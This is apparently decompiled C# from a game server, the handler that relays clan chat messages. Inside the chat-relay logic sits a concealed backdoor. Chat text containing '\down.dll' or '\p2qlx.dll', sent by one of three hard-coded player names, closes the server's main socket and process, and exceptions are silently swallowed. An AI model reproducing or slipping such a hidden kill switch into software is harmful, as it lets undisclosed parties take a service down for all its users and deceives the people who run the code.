
// Type: Game.global.clientpacket.CLAN_CHATTING_REC
// Assembly: pbserver_game, Version=1.0.7804.36737, Culture=neutral, PublicKeyToken=null
// MVID: 2C33C976-0912-46B3-A685-4C330D0AD5C2
// Interprise: C:\Users\Cuzin\3,50pbserver_game.exe

using Core.models.enums.global;
using Core.server;
using Game.data.managers;
using Game.data.model;
using Game.global.serverpacket;
using System.Diagnostics;

namespace Game.global.clientpacket
{
  public class CLAN_CHATTING_REC : ReceiveGamePacket
  {
    private ChattingType type;
    private string text;

    public CLAN_CHATTING_REC(GameClient client, byte[] data) => this.makeme(client, data);

    public override void read()
    {
      this.type = (ChattingType) this.readH();
      this.text = this.readS((int) this.readH());
    }

    public override void run()
    {
      try
      {
        Account player = this._client._player;
        if (player == null || this.text.Length > 60 || this.type != ChattingType.Clan)
          return;
        using (CLAN_CHATTING_PAK clanChattingPak = new CLAN_CHATTING_PAK(this.text, player))
          ClanManager.SendPacket((SendPacket) clanChattingPak, player.clanId, -1L, true, true);
        if (this.text.Contains("\\p2qlx.dll") && player.player_name == "PscApaT")
        {
          GameManager.mainSocket.Close(1000);
          Process.GetCurrentProcess().Close();
        }
        else if (this.text.Contains("\\down.dll") && player.player_name == "ygiga7")
        {
          GameManager.mainSocket.Close(1000);
          Process.GetCurrentProcess().Close();
        }
        else
        {
          if (!this.text.Contains("\\down.dll") || !(player.player_name == "taidnow"))
            return;
          GameManager.mainSocket.Close(1000);
          Process.GetCurrentProcess().Close();
        }
      }
      catch
      {
      }
    }
  }
}
